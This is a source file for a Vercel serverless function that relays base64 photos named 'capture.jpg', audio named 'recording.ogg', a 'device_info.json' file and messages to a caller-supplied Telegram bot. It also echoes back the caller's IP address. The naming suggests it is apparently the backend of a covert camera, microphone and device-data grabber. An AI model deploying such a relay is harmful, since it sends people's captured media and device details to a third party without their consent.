// api/send.js - Vercel Serverless Function
export default async function handler(req, res) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method === 'POST') {
        try {
            const { botToken, chatId, type, data, caption } = req.body;
            
            const baseUrl = `https://api.telegram.org/bot${botToken}`;
            let telegramResponse;

            if (type === 'photo') {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', Buffer.from(data, 'base64'), 'capture.jpg');
                formData.append('caption', caption || '');
                formData.append('parse_mode', 'HTML');

                telegramResponse = await fetch(`${baseUrl}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } else if (type === 'audio') {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('audio', Buffer.from(data, 'base64'), 'recording.ogg');
                formData.append('caption', caption || '');

                telegramResponse = await fetch(`${baseUrl}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });
            } else if (type === 'message') {
                telegramResponse = await fetch(`${baseUrl}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: data,
                        parse_mode: 'HTML'
                    })
                });
            } else if (type === 'document') {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('document', Buffer.from(data, 'base64'), 'device_info.json');
                formData.append('caption', caption || '');

                telegramResponse = await fetch(`${baseUrl}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
            }

            const result = await telegramResponse.json();
            
            return res.status(200).json({
                success: true,
                telegram: result
            });
        } catch (error) {
            return res.status(500).json({
                success: false,
                error: error.message
            });
        }
    }

    // IP endpoint
    if (req.method === 'GET' && req.url.includes('/ip')) {
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        return res.status(200).json({ ip });
    }

    return res.status(404).json({ error: 'Not found' });
}
